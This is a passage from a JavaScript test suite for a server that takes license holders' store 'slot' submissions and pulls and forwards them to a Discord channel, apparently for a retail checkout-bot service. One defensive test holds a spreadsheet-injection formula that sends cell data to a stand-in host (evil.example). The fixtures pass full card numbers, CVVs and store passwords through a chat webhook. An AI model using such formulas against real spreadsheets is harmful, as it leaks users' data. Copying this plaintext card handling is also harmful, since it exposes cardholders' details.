    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Slot request denied/);
  });
  await test("a denied request can be approved later", async () => {
    await slotPost(frankLink, "approve");
    assert.equal((await (await slots("/slots/limit", frankKey)).json()).limit, 40);
  });
  await test("a revoked key can't ask or read its limit", async () => {
    await admin("/admin/revoke", { key: frankKey });
    assert.equal((await slots("/slots/limit", frankKey)).status, 401);
    assert.equal((await slots("/slots/request", frankKey, { requested: 80 })).status, 401);
    await admin("/admin/restore", { key: frankKey });
  });
  await test("at most 3 requests a day per license", async () => {
    for (const n of [41, 42]){
      const r = await (await slots("/slots/request", frankKey, { requested: n })).json();
      assert.equal(r.status, "pending");
      const link = slotLink(await new Promise((ok) => setTimeout(() => ok(webhookPosts.at(-1).content), 300)));
      await slotPost(link, "deny");
    }
    assert.equal((await slots("/slots/request", frankKey, { requested: 43 })).status, 429);
  });
  await test("admin lists limits and requests with review links", async () => {
    const d = await (await admin("/admin/slots")).json();
    assert.equal(d.default, 20);
    assert.equal(d.limits.length, 1); assert.equal(d.limits[0].slot_limit, 40);
    assert.equal(d.requests.length, 3);
    assert.ok(d.requests.every((q) => q.review_url.includes("/slots/review/") && q.review_token === undefined && q.key_hash === undefined));
  });
  console.log("\nSubmissions");
  const b64u = (b) => Buffer.from(b).toString("base64url");
  const newCollectKey = async () => {
    const kp = await crypto.subtle.generateKey({ name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"]);
    const raw = new Uint8Array(await crypto.subtle.exportKey("raw", kp.publicKey));
    const h = new Uint8Array(await crypto.subtle.digest("SHA-256", raw));
    const hex = Buffer.from(h).toString("hex").toUpperCase();
    return { pub: b64u(raw), keyId: hex.slice(0, 4) + "-" + hex.slice(4, 8), fingerprint: hex.slice(0, 32).match(/.{4}/g).join(" ") };
  };
  const fakeCode = (n = 200) => "PVSUB1." + b64u(crypto.getRandomValues(new Uint8Array(65))) + "." + b64u(crypto.getRandomValues(new Uint8Array(12))) + "." + b64u(crypto.getRandomValues(new Uint8Array(n)));
  const keyLink = (content) => (content.match(/\((http[^)]+\/submit\/review\/[^)]+)\)/) || [])[1];
  const keyPost = (link, action) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const ownerKey = await newCollectKey(), otherKey = await newCollectKey();
  let ownerLink;
  await test("there's no collecting key until the owner confirms one", async () => {
    assert.deepEqual(await getJson("/submit/key"), { pub: null, keyId: null });
    const r = await slots("/submissions", frankKey, { code: fakeCode(), keyId: ownerKey.keyId, slots: 1 });
    assert.equal(r.status, 409); assert.equal((await r.json()).error, "no collecting key");
  });
  await test("offering a key needs a license and a real P-256 key", async () => {
    assert.equal((await slots("/submit/key", null, { pub: ownerKey.pub })).status, 401);
    assert.equal((await slots("/submit/key", frankKey, { pub: "nope" })).status, 400);
    const bad = Buffer.from(ownerKey.pub, "base64url"); bad[64] ^= 1;   // no longer a point on the curve
    assert.equal((await slots("/submit/key", frankKey, { pub: b64u(bad) })).status, 400);
  });
  await test("an offer whose post failed is posted when the app offers it again", async () => {
    const k = await newCollectKey();
    webhookFail.push(500);
    assert.equal((await (await slots("/submit/key", frankKey, { pub: k.pub })).json()).status, "pending");
    await new Promise((ok) => setTimeout(ok, 400));
    const before = webhookPosts.length;
    assert.equal((await (await slots("/submit/key", frankKey, { pub: k.pub })).json()).status, "pending");
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    await keyPost(keyLink(webhookPosts.at(-1).content), "deny");
  });
  await test("an offered key is posted to the channel with its key ID, and isn't used yet", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/submit/key", GH_KEY, { pub: ownerKey.pub, name: "Owner" })).json();
    assert.deepEqual(r, { status: "pending", keyId: ownerKey.keyId });
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, new RegExp("with key " + ownerKey.keyId)); assert.match(m, /Only confirm if the key ID and fingerprint on the review page match your own FAFO/);
    ownerLink = keyLink(m); assert.ok(ownerLink);
    assert.equal((await getJson("/submit/key")).pub, null);
    assert.equal((await getJson("/submit/key?pub=" + ownerKey.pub)).mine, "pending");
    const again = await (await slots("/submit/key", GH_KEY, { pub: ownerKey.pub })).json();
    assert.equal(again.status, "pending");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before + 1, "not posted twice");
  });
  await test("the key review page needs its token and changes nothing by itself", async () => {
    assert.equal((await fetch(ownerLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await keyPost(ownerLink.replace(/t=[^&]+/, "t=nope"), "confirm")).status, 404);
    const html = await (await fetch(ownerLink)).text();
    assert.match(html, new RegExp(ownerKey.keyId)); assert.match(html, new RegExp(ownerKey.fingerprint)); assert.match(html, /Waiting for you/);
    assert.equal((await getJson("/submit/key")).pub, null);
  });
  await test("confirming makes it the key everyone's Orbit encrypts to", async () => {
    assert.match(await (await keyPost(ownerLink, "confirm")).text(), /Confirmed/);
    assert.deepEqual(await getJson("/submit/key"), { pub: ownerKey.pub, keyId: ownerKey.keyId, fingerprint: ownerKey.fingerprint });
    assert.equal((await getJson("/submit/key?pub=" + ownerKey.pub)).mine, "active");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Submissions now arrive here/);
    assert.equal((await (await slots("/submit/key", GH_KEY, { pub: ownerKey.pub })).json()).status, "active");
  });
  let code;
  await test("a submission is posted as an attachment, with only the sealed code in it", async () => {
    code = fakeCode(3000);
    const before = webhookPosts.length;
    const r = await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, name: "Frank *F*", slots: 3, stores: [{ name: "Target", n: 2 }, { name: "Best_Buy", n: 1 }] });
    assert.equal(r.status, 200); assert.equal((await r.json()).ok, true);
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\*\*3 slots\*\* from \*\*Frank \\\*F\\\*\*\* · @frank · license …/);
    assert.match(m.content, /Target 2 · Best\\_Buy 1/); assert.match(m.content, new RegExp("key " + ownerKey.keyId));
    assert.equal(m.files.length, 1); assert.equal(m.files[0].text, code);
    assert.match(m.files[0].name, /^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-Frank-F\.txt$/);
    assert.equal(m.allowed_mentions.parse.length, 0);
  });
  await test("submissions need a license, a sealed code and the current key", async () => {
    assert.equal((await slots("/submissions", null, { code, keyId: ownerKey.keyId, slots: 1 })).status, 401);
    assert.equal((await slots("/submissions", frankKey, { code: '{"cards":[]}', keyId: ownerKey.keyId, slots: 1 })).status, 400);
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 0 })).status, 400);
    const r = await slots("/submissions", frankKey, { code, keyId: otherKey.keyId, slots: 1 });
    assert.equal(r.status, 409);
    assert.deepEqual(await r.json(), { error: "key changed", pub: ownerKey.pub, keyId: ownerKey.keyId });
  });
  await test("sending the same batch again (its answer got lost) doesn't post it twice", async () => {
    const batch = "batch" + rid();
    const before = webhookPosts.length;
    const first = await (await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 2, batch })).json();
    assert.deepEqual(first, { ok: true, id: batch });
    const again = await (await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 2, batch })).json();
    assert.equal(again.ok, true); assert.equal(again.duplicate, true);
    assert.equal(webhookPosts.length, before + 1);
    assert.equal((await slots("/submissions", GH_KEY, { code, keyId: ownerKey.keyId, slots: 2, batch })).status, 409, "another license can't reuse it");
  });
  await test("if the channel refuses the post, the app is told", async () => {
    webhookFail.push(500);
    const batch = "failing" + rid();
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 1, batch })).status, 502);
    const before = webhookPosts.length;
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 1, batch })).status, 200, "and trying again posts it");
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("a new key replaces the old one once confirmed", async () => {
    await slots("/submit/key", frankKey, { pub: otherKey.pub });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = keyLink(webhookPosts.at(-1).content);
    assert.equal((await getJson("/submit/key")).keyId, ownerKey.keyId, "old key stays until confirmed");
    await keyPost(link, "confirm");
    assert.equal((await getJson("/submit/key")).keyId, otherKey.keyId);
    assert.equal((await getJson("/submit/key?pub=" + ownerKey.pub)).mine, "replaced");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.ok(webhookEdits.some((e) => /replaced by a newer one/.test(e.content)));
    await keyPost(ownerLink, "confirm");
    assert.equal((await getJson("/submit/key")).keyId, ownerKey.keyId, "the owner can switch back");
  });
  await test("stopping the key stops submissions", async () => {
    await keyPost(ownerLink, "deny");
    assert.equal((await getJson("/submit/key")).pub, null);
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 1 })).status, 409);
    await keyPost(ownerLink, "confirm");
  });
  await test("at most 30 submissions an hour per license", async () => {
    const small = fakeCode();
    for (let i = 0; i < 29; i++) assert.equal((await slots("/submissions", GH_KEY, { code: small, keyId: ownerKey.keyId, slots: 1 })).status, 200);
    assert.equal((await slots("/submissions", GH_KEY, { code: small, keyId: ownerKey.keyId, slots: 1 })).status, 200);
    assert.equal((await slots("/submissions", GH_KEY, { code: small, keyId: ownerKey.keyId, slots: 1 })).status, 429);
  });
  await test("admin lists keys (with review links) and submissions, never the codes", async () => {
    const d = await (await admin("/admin/submissions")).json();
    assert.equal(d.keys.length, 3);
    assert.ok(d.keys.every((k) => k.review_url.includes("/submit/review/") && k.review_token === undefined && k.key_hash === undefined));
    assert.equal(d.submissions.length, 33);
    assert.ok(d.submissions.every((x) => x.code === undefined && x.bytes > 0));
  });

  console.log("\nPulls");
  const pull = (key, body) => slots("/pull", key, body);
  const sentOn = Date.parse("2026-09-26T15:00:00Z");
  const two = [
    { store: "Target", profile: "Kim   Lee", email: "kim_lee@example.com", card: "Visa 4242", sentAt: sentOn },
    { store: "Best Buy", profile: "Sam\nPark", email: "", card: "Amex 1005", sentAt: sentOn - 86400000 },
  ];
  let pullBatch;
  await test("pulls need a license", async () => {
    assert.equal((await pull(null, { keyId: ownerKey.keyId, slots: two })).status, 401);
    const r = await pull("PVLT-AAAA-BBBB-CCCC-DDDD", { keyId: ownerKey.keyId, slots: two });
    assert.equal(r.status, 401); assert.deepEqual(await r.json(), { error: "license not recognized" });
  });
  await test("a pull for a key this license never sent slots to isn't posted", async () => {
    const before = webhookPosts.length;
    assert.deepEqual(await (await pull(frankKey, { keyId: otherKey.keyId, name: "Frank", slots: two })).json(), { ok: true, forwarded: false });
    assert.deepEqual(await (await pull(frankKey, { keyId: "ABCD-1234", slots: two })).json(), { ok: true, forwarded: false });
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("pulling sent slots posts them to the channel as a plain list", async () => {
    pullBatch = "pull" + rid();
    const before = webhookPosts.length;
    const r = await pull(frankKey, { keyId: ownerKey.keyId.toLowerCase(), name: "Frank *F*", batch: pullBatch, slots: two });
    assert.equal(r.status, 200);
    assert.deepEqual(await r.json(), { ok: true, forwarded: true, id: pullBatch });
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.ok(m.content.startsWith(`🔻 **2 slots pulled** by **Frank \\*F\\*** · @frank · license …${frankKey.slice(-4)}\n`), m.content);
    assert.ok(m.content.includes("\nTarget · Kim Lee · kim\\_lee@example.com · Visa 4242 · sent 2026-09-26\n"), "email is markdown-escaped");
    assert.ok(m.content.includes("\nBest Buy · Sam Park · Amex 1005 · sent 2026-09-25\n"), "empty parts are left out");
    assert.ok(m.content.endsWith(`\n-# Take them off their list. Sent for key ${ownerKey.keyId}.`));
    assert.equal(m.files.length, 0); assert.equal(m.flags, 4); assert.equal(m.allowed_mentions.parse.length, 0);
  });
  await test("sending the same pull again (its answer got lost) doesn't post it twice", async () => {
    const before = webhookPosts.length;
    const again = await pull(frankKey, { keyId: ownerKey.keyId, batch: pullBatch, slots: two });
    assert.deepEqual(await again.json(), { ok: true, forwarded: true, duplicate: true, id: pullBatch });
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("another license can't reuse a pull's batch id", async () => {
    const r = await pull(GH_KEY, { keyId: ownerKey.keyId, batch: pullBatch, slots: two });
    assert.equal(r.status, 409); assert.deepEqual(await r.json(), { error: "batch id taken" });
  });
  await test("one slot pulled", async () => {
    const r = await (await pull(frankKey, { keyId: ownerKey.keyId, slots: [{ store: "Walmart", profile: "Solo", sentAt: "yesterday" }] })).json();
    assert.equal(r.forwarded, true);
    const m = webhookPosts.at(-1).content;
    assert.ok(m.startsWith(`🔻 **1 slot pulled** by @frank · license …${frankKey.slice(-4)}\n`), m);
    assert.ok(m.includes("\nWalmart · Solo\n"), "a sentAt that isn't a time is left off");
    assert.match(m, /Take it off their list\./);
  });
  await test("pulls need a key ID and at least one slot with a store or profile", async () => {
    for (const body of [
      { keyId: ownerKey.keyId, slots: [] },
      { keyId: ownerKey.keyId },
      { keyId: ownerKey.keyId, slots: [{ email: "a@b.c", card: "Visa 1111" }, null, "x"] },
      { keyId: ownerKey.keyId, slots: Array.from({ length: 501 }, () => ({ store: "Target" })) },
      { keyId: "nope", slots: two },
      { keyId: ownerKey.keyId + "0", slots: two },
      { slots: two },
    ]) assert.equal((await pull(frankKey, body)).status, 400, JSON.stringify(body).slice(0, 80));
    assert.equal((await pull(frankKey, { keyId: ownerKey.keyId, slots: two, pad: "x".repeat(210000) })).status, 413);
  });
  await test("a long pull is attached as a file, with counts per store in the message", async () => {
    const many = Array.from({ length: 60 }, (_, i) => ({
      store: i % 2 ? "Walmart" : "Target", profile: `Profile ${i} ` + "with a very long name ".repeat(5),
      email: `shopper_${i}@example.com`, card: "Mastercard 5454", sentAt: sentOn,
    }));
    const before = webhookPosts.length;
    const r = await (await pull(frankKey, { keyId: ownerKey.keyId, name: "Frank *F*", slots: many })).json();
    assert.equal(r.forwarded, true);
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.ok(m.content.length <= 2000, "fits in one Discord message: " + m.content.length);
    assert.match(m.content, /^🔻 \*\*60 slots pulled\*\* by \*\*Frank/);
    assert.match(m.content, /\nTarget 30 · Walmart 30\n/);
    assert.ok(m.content.endsWith(`\n-# The full list is attached. Take them off their list. Sent for key ${ownerKey.keyId}.`));
    assert.doesNotMatch(m.content, /Profile 0/, "the list itself is only in the file");
    assert.equal(m.files.length, 1);
    assert.match(m.files[0].name, /^orbit-pulled-\d{4}-\d\d-\d\d-\d{4}-Frank-F\.txt$/);
    const clip = (s, n) => s.replace(/\s+/g, " ").trim().slice(0, n);
    assert.deepEqual(m.files[0].text.trim().split("\n"),
      many.map((x) => `${x.store} | ${clip(x.profile, 80)} | ${x.email} | Mastercard 5454 | sent 2026-09-26`), "every slot, not markdown-escaped");
  });
  await test("if the channel refuses a pull, the app is told and sending it again posts it", async () => {
    webhookFail.push(500);
    const batch = "pullfail" + rid();
    const r = await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two });
    assert.equal(r.status, 502); assert.deepEqual(await r.json(), { error: "couldn't post to the channel" });
    const before = webhookPosts.length;
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("a pull still posts when the app hangs up mid-post, and its retry isn't posted again", async () => {
    const batch = "pullhang" + rid(), before = webhookPosts.length;
    webhookHang = { ms: 1500 };
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 300);
    await assert.rejects(fetch(BASE + "/pull", { method: "POST", signal: ac.signal, headers: { authorization: "Bearer " + frankKey, "content-type": "application/json" },
      body: JSON.stringify({ keyId: ownerKey.keyId, batch, slots: two }) }));
    await new Promise((ok) => setTimeout(ok, 2500));
    assert.equal(webhookPosts.length, before + 1, "posted after the app hung up");
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, duplicate: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("a pull still unposted after PULL_STALE_MS is taken over by a retry, and the first attempt failing late doesn't undo it", async () => {
    // The first attempt's post hangs for 6 s and then fails; the app gave up on it long before.
    const batch = "stuck" + rid(), before = webhookPosts.length, t0 = Date.now();
    webhookHang = { ms: 6000, code: 500 };
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 300);
    await assert.rejects(fetch(BASE + "/pull", { method: "POST", signal: ac.signal, headers: { authorization: "Bearer " + frankKey, "content-type": "application/json" },
      body: JSON.stringify({ keyId: ownerKey.keyId, batch, slots: two }) }));
    const r = await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two });
    assert.equal(r.status, 425, "a recent attempt may still be posting"); assert.deepEqual(await r.json(), { error: "still sending" });
    await new Promise((ok) => setTimeout(ok, Math.max(0, t0 + 3600 - Date.now())));
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
    await new Promise((ok) => setTimeout(ok, Math.max(0, t0 + 7500 - Date.now())));   // the first attempt has failed by now
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, duplicate: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("at most 30 pulls an hour per license", async () => {
    const one = [{ store: "Target", profile: "Kim" }];
    for (let i = 0; i < 30; i++) assert.equal((await (await pull(GH_KEY, { keyId: ownerKey.keyId, slots: one })).json()).forwarded, true);
    const r = await pull(GH_KEY, { keyId: ownerKey.keyId, slots: one });
    assert.equal(r.status, 429); assert.deepEqual(await r.json(), { error: "too many pulls this hour" });
    assert.equal((await (await pull(frankKey, { keyId: ownerKey.keyId, slots: one })).json()).forwarded, true, "other licenses can still pull");
  });
  await test("admin lists pulls, without what was in them", async () => {
    const d = await (await admin("/admin/submissions")).json();
    assert.equal(d.pulls.length, 37);
    assert.deepEqual(Object.keys(d.pulls[0]).sort(), ["created_at", "id", "key_id", "key_last4", "name", "slots", "username"]);
    const p = d.pulls.find((x) => x.id === pullBatch);
    assert.deepEqual([p.slots, p.name, p.username, p.key_id], [2, "Frank *F*", "frank", ownerKey.keyId]);
  });

  console.log("\nCSV submissions (app 1.9.52+)");
  const csv = "profile_name,group,email,card_number,card_cvv,target_account_email,target_account_password\r\n" +
    'Kim Lee,Beta,kim@example.com,4242424242424242,123,kim.target@example.com,"pa,ss""word"\r\n' +
    "Sam Park,Main,sam@example.com,5454545454545454,456,,\r\n";
  let csvBatch;
  await test("a CSV batch is posted as a .csv file, and needs no collecting key", async () => {
    await keyPost(ownerLink, "deny");
    assert.equal((await getJson("/submit/key")).pub, null);
    csvBatch = "csv" + rid();
    const before = webhookPosts.length;
    const r = await slots("/submissions", frankKey, { csv, name: "Beta", slots: 2, stores: [{ name: "Target", n: 2 }], batch: csvBatch });
    assert.equal(r.status, 200); assert.deepEqual(await r.json(), { ok: true, id: csvBatch });
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.ok(m.content.startsWith(`📦 **2 slots** from **Beta** · @frank · license …${frankKey.slice(-4)}\nTarget 2\n`), m.content);
    assert.ok(m.content.endsWith("\n-# CSV attached."), m.content);
    assert.equal(m.files.length, 1); assert.deepEqual(asShown(m.files[0].text), csvRows(csv), "the CSV as sent, as Excel shows it");
    assert.equal(m.files[0].text.split("\r\n")[1], 'Kim Lee,Beta,kim@example.com,"=""4242424242424242""","=""123""",kim.target@example.com,"pa,ss""word"', "card number and CVV as Excel text");
    assert.ok(m.files[0].text.endsWith("\r\n"), "ends as it did");
    assert.match(m.files[0].name, /^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-Beta\.csv$/);
    assert.match(m.files[0].type, /^text\/csv/);
    assert.equal(m.allowed_mentions.parse.length, 0);
  });
  await test("sending the same CSV batch again doesn't post it twice", async () => {
    const before = webhookPosts.length;
    const again = await (await slots("/submissions", frankKey, { csv, name: "Beta", slots: 2, batch: csvBatch })).json();
    assert.equal(again.ok, true); assert.equal(again.duplicate, true);
    assert.equal(webhookPosts.length, before);
  });
  await test("a CSV batch needs a license, Orbit's CSV header and a slot count, and has a size limit", async () => {
    assert.equal((await slots("/submissions", null, { csv, slots: 2 })).status, 401);
    for (const body of [
      { csv: "", slots: 1 },
      { csv: "name,email\r\nKim,kim@example.com\r\n", slots: 1 },
      { csv: "\r\n" + csv, slots: 1 },
      { csv, slots: 0 },
      { csv: 42, slots: 1 },
    ]) assert.equal((await slots("/submissions", frankKey, body)).status, 400, JSON.stringify(body).slice(0, 60));
    assert.equal((await slots("/submissions", frankKey, { csv: "\uFEFF" + csv, slots: 2 })).status, 200, "a byte-order mark is fine");
    assert.equal((await slots("/submissions", frankKey, { csv: csv + "x".repeat(4_050_000), slots: 2 })).status, 413);
  });
  await test("pulling slots that were sent as CSV posts them, and says so", async () => {
    const before = webhookPosts.length;
    const r = await (await pull(frankKey, { keyId: "csv", name: "Beta", slots: two })).json();
    assert.equal(r.forwarded, true);
    assert.equal(webhookPosts.length, before + 1);
    assert.ok(webhookPosts.at(-1).content.endsWith("\n-# Take them off their list. Sent as CSV."), webhookPosts.at(-1).content);
    assert.doesNotMatch(webhookPosts.at(-1).content, /4242424242424242/, "never the card number");
  });
  await test("a CSV pull from a license that never sent a CSV batch isn't posted", async () => {
    const before = webhookPosts.length;
    assert.deepEqual(await (await pull(GH_KEY, { keyId: "CSV", slots: two })).json(), { ok: true, forwarded: false });
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("admin lists CSV batches as key CSV, never the CSV itself", async () => {
    const d = await (await admin("/admin/submissions")).json();
    const s = d.submissions.find((x) => x.id === csvBatch);
    assert.equal(s.key_id, "CSV"); assert.equal(s.slots, 2); assert.equal(s.bytes, csv.length);
    assert.ok(d.submissions.every((x) => x.csv === undefined && x.code === undefined));
  });
  await test("slots asking the owner to assign an account are counted on their store's line (app 1.9.53+)", async () => {
    const before = webhookPosts.length;
    const r = await slots("/submissions", frankKey, { csv, name: "Beta", slots: 9, stores: [
      { name: "Target", n: 3, seller: 2 }, { name: "Walmart", n: 1, seller: 1 }, { name: "Best Buy", n: 1, seller: 0 },
      { name: "Costco", n: 2, seller: 9 }, { name: "Nike", n: 1, seller: -3 }, { name: "Topps", n: 1, seller: "x" }] });
    assert.equal(r.status, 200);
    assert.equal(webhookPosts.length, before + 1);
    assert.match(webhookPosts.at(-1).content,
      /\nTarget 3 \(2 need an account\) · Walmart 1 \(1 needs an account\) · Best Buy 1 · Costco 2 \(2 need an account\) · Nike 1 · Topps 1\n/,
      "counted, capped at the store's slots, and left off when there are none or it isn't a number");
  });
  console.log("\nPer-store files (app 1.9.53+)");
  const tgtCsv = "profile_name,first_name,last_name,email,phone_num,cc_number,cc_exp_month,cc_exp_year,cc_cvv,shipping_street,shipping_street_2,shipping_city,shipping_state,shipping_zip_code,shipping_country,billing_first_name,billing_last_name,billing_street,billing_street_2,billing_city,billing_state,billing_zip_code,billing_country\r\n" +
    "Kim Lee,Kim,Lee,kim@example.com,5550100,4242424242424242,07,2029,123,1 Main St,,Austin,TX,78701,US,Kim,Lee,1 Main St,,Austin,TX,78701,US";
  const wmCsv = tgtCsv.replace("Kim Lee,Kim,Lee", "Sam Park,Sam,Park");
  await test("a batch comes as one profiles .csv per store, with its logins in a .txt, named by store", async () => {
    const before = webhookPosts.length;
    const files = [
      { store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: "kim.target@example.com:pa:ss" },
      { store: "Walmart", kind: "profiles", text: wmCsv }, { store: "Pokémon Center", kind: "profiles", text: tgtCsv }];
    const r = await slots("/submissions", frankKey, { files, name: "Beta", slots: 3, batch: "files" + rid(),
      stores: [{ name: "Target", n: 1 }, { name: "Walmart", n: 1, seller: 1 }, { name: "Pokémon Center", n: 1 }] });
    assert.equal(r.status, 200);
    assert.equal(webhookPosts.length, before + 1, "one message");
    const m = webhookPosts.at(-1);
    assert.ok(m.content.startsWith(`📦 **3 slots** from **Beta** · @frank · license …${frankKey.slice(-4)}\nTarget 1 · Walmart 1 (1 needs an account) · Pokémon Center 1\n`), m.content);
    assert.ok(m.content.endsWith("\n-# One profiles file (.csv) per store, with its logins (email:password, .txt) in the same order. Profiles that need an account come last."), m.content);
    assert.deepEqual(m.files.map((f) => f.name.replace(/^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-/, "")), ["Beta-target.csv", "Beta-target-logins.txt", "Beta-walmart.csv", "Beta-pokemon-center.csv"]);
    assert.deepEqual(m.files.map((f) => asShown(f.text)), files.map((f) => csvRows(f.text)), "each file as sent, as Excel shows it");
    assert.equal(m.files[1].text, files[1].text, "the logins file exactly as sent");
    assert.match(m.files[0].type, /^text\/csv/); assert.match(m.files[1].type, /^text\/plain/);
  });
  const slotHead = tgtCsv.split("\r\n")[0];
  await test("number cells go out as Excel text, so the full card number and leading zeros show", async () => {
    const sent = slotHead + "\r\nAnn One,Ann,One,ann@example.com,+15550100,5555555555554444,09,2031,053,1 Main St,,Boston,MA,02139,US,Ann,One,1 Main St,,Boston,MA,02139,US";
    const r = await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: sent }], name: "Beta", slots: 1, batch: "xl" + rid() });
    assert.equal(r.status, 200);
    const got = webhookPosts.at(-1).files[0].text.split("\r\n");
    assert.equal(got[0], slotHead, "the header as sent");
    assert.equal(got[1], 'Ann One,Ann,One,ann@example.com,"=""+15550100""","=""5555555555554444""","=""09""",2031,"=""053""",1 Main St,,Boston,MA,"=""02139""",US,Ann,One,1 Main St,,Boston,MA,"=""02139""",US');
  });
  await test("a buyer's cell that starts with = + - or @ goes out as text, never as a formula", async () => {
    const evil = '=HYPERLINK("http://evil.example/?"&F2,"Click")', long = "=" + "x".repeat(600);
    const row = [evil, "Ann", "One", "ann@example.com", "5550100", "4242424242424242", "07", "2029", "123", "+1 Main St", "-", "@home", "TX", "78701", "US", "Ann", "One", long, "", "Austin", "TX", "78701", "US"];
    const r = await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: slotHead + "\r\n" + row.map(cellT).join(",") }], name: "Beta", slots: 1, batch: "xl" + rid() });
    assert.equal(r.status, 200);
    const posted = csvRows(webhookPosts.at(-1).files[0].text)[1];
    assert.equal(posted[0], '="=HYPERLINK(""http://evil.example/?""&F2,""Click"")"');
    assert.deepEqual([posted[9], posted[10], posted[11]], ['="+1 Main St"', '="-"', '="@home"']);
    assert.match(posted[17], /^="=x{249}"&"x{250}"&"x{101}"$/, "a long one in parts of 250 at most, which Excel takes");
    assert.deepEqual(posted.map(shown), row, "Excel shows exactly what was typed");
    for (const v of posted) assert.ok(!/^[=+\-@]/.test(v) || EXCEL_STRINGS.test(v), "nothing that runs but plain strings: " + v);
  });
  await test("per-store files need a store, a kind, some text, and at least one profiles CSV", async () => {
    for (const files of [
      [], [{ store: "Target", kind: "logins", text: "a@b.co:p" }],
      [{ store: "", kind: "profiles", text: tgtCsv }], [{ store: "Target", kind: "other", text: tgtCsv }],
      [{ store: "Target", kind: "profiles", text: "name,email\r\nKim,kim@example.com" }], [{ store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: " " }],
      Array.from({ length: 41 }, () => ({ store: "Target", kind: "profiles", text: tgtCsv })),
    ]) assert.equal((await slots("/submissions", frankKey, { files, slots: 1 })).status, 400, JSON.stringify(files).slice(0, 80));
  });
  await test("more than 10 files go out in follow-up messages", async () => {
    const before = webhookPosts.length;
    const files = [];
    for (let i = 0; i < 12; i++) files.push({ store: "Store " + i, kind: "profiles", text: tgtCsv }, { store: "Store " + i, kind: "logins", text: `a${i}@example.com:pw` });
    const r = await slots("/submissions", frankKey, { files, name: "Beta", slots: 12, batch: "many" + rid() });
    assert.equal(r.status, 200);
    const posts = webhookPosts.slice(before);
    assert.deepEqual(posts.map((m) => m.files.length), [10, 10, 4]);
    assert.ok(posts[0].content.startsWith("📦 **12 slots** from **Beta**"), posts[0].content);
    assert.equal(posts[1].content, `-# More files for the batch from **Beta** · @frank · license …${frankKey.slice(-4)} (11–20 of 24).`);
    assert.deepEqual(posts.flatMap((m) => m.files.map((f) => asShown(f.text))), files.map((f) => csvRows(f.text)), "every file, in order");
  });
  await test("if a follow-up message fails, the app is told, and sending again posts every file", async () => {
    const files = [];
    for (let i = 0; i < 6; i++) files.push({ store: "Shop " + i, kind: "profiles", text: tgtCsv }, { store: "Shop " + i, kind: "logins", text: `b${i}@example.com:pw` });
    const batch = "part" + rid(), before = webhookPosts.length;
    webhookFail.push(0, 500);
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 6, batch })).status, 502);
    assert.equal(webhookPosts.length, before + 1, "the first part went out");
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 6, batch })).status, 200);
    assert.deepEqual(webhookPosts.slice(before + 1).map((m) => m.files.length), [10, 2], "sent again in full");
  });
  console.log("\nAssigned accounts (app 1.9.58+)");
  let ginaKey, bobKey, reviewLink;
  const newKey = async (who) => { const r = rid(); await signIn(r, who); const st = await getJson("/discord/status/" + r); assert.equal(st.status, "issued"); return st.key; };
  const offerLink = (content) => (content.match(/\((http[^)]+\/accounts\/review\/[^)]+)\)/) || [])[1];
